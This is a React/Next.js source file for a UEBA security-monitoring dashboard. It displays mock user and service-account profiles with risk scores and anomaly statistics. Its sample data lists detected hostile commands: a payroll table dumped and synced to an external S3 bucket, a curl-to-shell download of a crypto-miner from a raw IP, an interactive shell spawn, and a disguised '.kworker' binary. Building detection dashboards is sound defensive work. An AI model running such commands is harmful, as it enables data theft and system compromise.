"use client";

import { useState } from "react";
import Link from "next/link";
import {
  Users, ShieldAlert, Activity, AlertTriangle, CheckCircle2, Clock, Globe, Database, ArrowRight, UserCheck, UserX, Cpu, Zap, RefreshCw
} from "lucide-react";

type EntityProfile = {
  id: string;
  name: string;
  type: "User Account" | "Service Account (Non-Human)" | "Production Endpoint";
  department: string;
  riskScore: number;
  anomalyLevel: "Critical Outlier (>= 3.5σ)" | "High Risk" | "Elevated Baseline" | "Normal Baseline";
  baselineAccessHours: string;
  observedAccessHours: string;
  timeZScore: number;
  egressBaselineMb: number;
  egressObservedMb: number;
  egressZScore: number;
  impossibleTravel: boolean;
  travelLocations?: string;
  rareCommands?: string[];
  anomaliesSummary: string;
};

const ENTITY_PROFILES: EntityProfile[] = [
  {
    id: "user-01",
    name: "david.miller@company.com",
    type: "User Account",
    department: "Finance & Accounting",
    riskScore: 94,
    anomalyLevel: "Critical Outlier (>= 3.5σ)",
    baselineAccessHours: "08:00 - 17:00 EST (Mon-Fri)",
    observedAccessHours: "03:14 AM EST (Sunday)",
    timeZScore: 4.12,
    egressBaselineMb: 85,
    egressObservedMb: 48500, // 48.5 GB
    egressZScore: 5.84,
    impossibleTravel: true,
    travelLocations: "New York, USA (03:00 AM) → Frankfurt, Germany (03:14 AM)",
    rareCommands: ["SELECT * INTO OUTFILE '/tmp/payroll.csv' FROM payroll_ledger", "aws s3 sync /tmp/ s3://external-staging-vault/"],
    anomaliesSummary: "Extreme 5.8σ data egress surge coupled with impossible geographic travel in 14 minutes. Immediate account freeze recommended."
  },
  {
    id: "svc-01",
    name: "svc-jenkins-deployer",
    type: "Service Account (Non-Human)",
    department: "DevSecOps Automation",
    riskScore: 88,
    anomalyLevel: "Critical Outlier (>= 3.5σ)",
    baselineAccessHours: "24/7 Programmatic CI/CD",
    observedAccessHours: "Interactive Shell Spawned",
    timeZScore: 3.75,
    egressBaselineMb: 1200,
    egressObservedMb: 1450,
    egressZScore: 0.42,
    impossibleTravel: false,
    rareCommands: ["/bin/bash -i", "curl http://185.192.110.45/miner.sh | sh", "chmod +x /tmp/.kworker"],
    anomaliesSummary: "Non-interactive CI/CD service account spawned interactive bash shell and attempted remote crypto-miner download."
  },
  {
    id: "user-02",
    name: "sarah.chen@company.com",
    type: "User Account",
    department: "Engineering (Backend)",
    riskScore: 18,
    anomalyLevel: "Normal Baseline",
    baselineAccessHours: "09:00 - 19:00 EST (Mon-Fri)",
    observedAccessHours: "10:30 AM EST (Today)",
    timeZScore: 0.15,
    egressBaselineMb: 450,
    egressObservedMb: 480,
    egressZScore: 0.22,
    impossibleTravel: false,
    anomaliesSummary: "Standard Git commit and PR merge activities within normal departmental baseline."
  }
];

export default function UebaPage() {
  const [selectedEntity, setSelectedEntity] = useState<EntityProfile>(ENTITY_PROFILES[0]);

  return (
    <div style={{ minHeight: "100vh", background: "var(--bg)", color: "var(--fg)", display: "flex", flexDirection: "column" }}>
      
      {/* Top Bar */}
      <header style={{ padding: "16px 28px", background: "var(--surface)", borderBottom: "1px solid var(--border)", display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 16 }}>
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <div style={{ padding: 6, borderRadius: 8, background: "rgba(0, 212, 255, 0.15)", border: "1px solid rgba(0, 212, 255, 0.3)" }}>
              <Users size={20} color="#00d4ff" />
            </div>
            <div>
              <h1 style={{ fontSize: 18, fontWeight: 900, color: "#fff" }}>
                User & Entity Behavior Analytics (UEBA Outlier Profiler - Layer 1.B)
              </h1>
              <p style={{ fontSize: 11.5, color: "var(--muted)" }}>
                Statistical Peer-Group Deviation · Impossible Geographic Travel · Data Egress Surge Scoring
              </p>
            </div>
          </div>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <Link
            href="/rbac"
            style={{
              padding: "7px 14px",
              borderRadius: 8,
              background: "var(--bg)",
              border: "1px solid var(--border)",
              color: "var(--muted)",
              fontSize: 11,
              fontWeight: 700,
              textDecoration: "none"
            }}
          >
            ← Back to RBAC
          </Link>
        </div>
      </header>

      {/* Main Layout */}
      <div style={{ flex: 1, padding: 24, display: "grid", gridTemplateColumns: "320px 1fr", gap: 24 }}>
        
        {/* Left Column: Entity Directory */}
        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          <span style={{ fontSize: 11, fontWeight: 800, textTransform: "uppercase", color: "var(--muted)" }}>
            Monitored Identities & Assets ({ENTITY_PROFILES.length})
          </span>

          {ENTITY_PROFILES.map(e => {
            const isSelected = e.id === selectedEntity.id;
            const isCritical = e.riskScore >= 80;
            return (
              <div
                key={e.id}
                onClick={() => setSelectedEntity(e)}
                style={{
                  background: isSelected ? "rgba(0, 212, 255, 0.08)" : "var(--surface)",
                  border: `1px solid ${isSelected ? "#00d4ff" : "var(--border)"}`,
                  borderRadius: 12,
                  padding: 14,
                  cursor: "pointer",
                  transition: "all 0.2s"
                }}
              >
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
                  <span style={{
                    fontSize: 9.5,
                    fontWeight: 800,
                    padding: "2px 8px",
                    borderRadius: 10,
                    background: isCritical ? "rgba(239,83,80,0.15)" : "rgba(52,199,89,0.15)",
                    color: isCritical ? "#ef5350" : "var(--green)",
                    border: `1px solid ${isCritical ? "#ef5350" : "var(--green)"}`
                  }}>
                    Risk: {e.riskScore}/100
                  </span>
                  <span style={{ fontSize: 10, color: "var(--muted)" }}>{e.type.split(" ")[0]}</span>
                </div>

                <h4 style={{ fontSize: 12.5, fontWeight: 700, color: "#fff", marginBottom: 4 }}>
                  {e.name}
                </h4>
                <div style={{ fontSize: 10.5, color: "var(--muted)" }}>
                  Dept: {e.department}
                </div>
              </div>
            );
          })}
        </div>

        {/* Right Column: Profiler Deep-Dive */}
        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 16, padding: 24, display: "flex", flexDirection: "column", gap: 20 }}>
          
          {/* Header */}
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: 12, borderBottom: "1px solid var(--border)", paddingBottom: 16 }}>
            <div>
              <h2 style={{ fontSize: 16, fontWeight: 800, color: "#fff" }}>{selectedEntity.name}</h2>
              <p style={{ fontSize: 11.5, color: "var(--muted)", marginTop: 2 }}>
                Entity Type: <strong style={{ color: "#00d4ff" }}>{selectedEntity.type}</strong> · Department: <span style={{ color: "#fff" }}>{selectedEntity.department}</span>
              </p>
            </div>

            <span style={{
              fontSize: 12,
              fontWeight: 800,
              padding: "6px 14px",
              borderRadius: 8,
              background: selectedEntity.riskScore >= 80 ? "rgba(239,83,80,0.15)" : "rgba(52,199,89,0.15)",
              color: selectedEntity.riskScore >= 80 ? "#ef5350" : "var(--green)",
              border: `1px solid ${selectedEntity.riskScore >= 80 ? "#ef5350" : "var(--green)"}`
            }}>
              ● {selectedEntity.anomalyLevel}
            </span>
          </div>

          {/* Anomaly Stat Matrix */}
          <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(200px, 1fr))", gap: 12 }}>
            <div style={{ background: "var(--bg)", border: "1px solid var(--border)", borderRadius: 10, padding: 14 }}>
              <span style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Time-of-Access Outlier</span>
              <div style={{ fontSize: 18, fontWeight: 900, color: selectedEntity.timeZScore >= 3.0 ? "#ef5350" : "var(--green)", marginTop: 2 }}>
                Z-Score: +{selectedEntity.timeZScore}σ
              </div>
              <span style={{ fontSize: 10.5, color: "var(--muted)", display: "block", marginTop: 4 }}>
                Observed: {selectedEntity.observedAccessHours}
              </span>
            </div>

            <div style={{ background: "var(--bg)", border: "1px solid var(--border)", borderRadius: 10, padding: 14 }}>
              <span style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Data Egress Volume Surge</span>
              <div style={{ fontSize: 18, fontWeight: 900, color: selectedEntity.egressZScore >= 3.0 ? "#ef5350" : "var(--green)", marginTop: 2 }}>
                {(selectedEntity.egressObservedMb / 1024).toFixed(1)} GB ({selectedEntity.egressZScore > 1 ? `+${selectedEntity.egressZScore}σ` : "Normal"})
              </div>
              <span style={{ fontSize: 10.5, color: "var(--muted)", display: "block", marginTop: 4 }}>
                Baseline: {selectedEntity.egressBaselineMb} MB/day
              </span>
            </div>

            <div style={{ background: "var(--bg)", border: "1px solid var(--border)", borderRadius: 10, padding: 14 }}>
              <span style={{ fontSize: 10, color: "var(--muted)", textTransform: "uppercase", fontWeight: 700 }}>Impossible Geolocation Travel</span>
              <div style={{ fontSize: 16, fontWeight: 900, color: selectedEntity.impossibleTravel ? "#ef5350" : "var(--green)", marginTop: 4 }}>
                {selectedEntity.impossibleTravel ? "🚨 Impossible Travel Confirmed" : "✓ Local Geo Consistent"}
              </div>
              {selectedEntity.travelLocations && (
                <span style={{ fontSize: 10, color: "var(--muted)", display: "block", marginTop: 4 }}>
                  {selectedEntity.travelLocations}
                </span>
              )}
            </div>
          </div>

          {/* Anomaly Narrative */}
          <div style={{ background: "var(--bg)", border: "1px solid var(--border)", borderRadius: 10, padding: 16 }}>
            <h3 style={{ fontSize: 13, fontWeight: 800, color: "#fff", marginBottom: 6 }}>
              UEBA Baseline Deviation & Behavior Analysis Summary
            </h3>
            <p style={{ fontSize: 11.5, color: "var(--fg)", lineHeight: 1.5, margin: 0 }}>
              {selectedEntity.anomaliesSummary}
            </p>
          </div>

          {/* Rare Commands If Present */}
          {selectedEntity.rareCommands && (
            <div>
              <label style={{ fontSize: 11, fontWeight: 700, color: "#ef5350", display: "block", marginBottom: 6 }}>
                Anomalous Process & Command Executions
              </label>
              <div style={{ background: "#000", border: "1px solid rgba(239,83,80,0.3)", borderRadius: 10, padding: 14, display: "flex", flexDirection: "column", gap: 6 }}>
                {selectedEntity.rareCommands.map((cmd, i) => (
                  <div key={i} style={{ fontSize: 11, fontFamily: "monospace", color: "#ef5350" }}>
                    $ {cmd}
                  </div>
                ))}
              </div>
            </div>
          )}

        </div>

      </div>
    </div>
  );
}
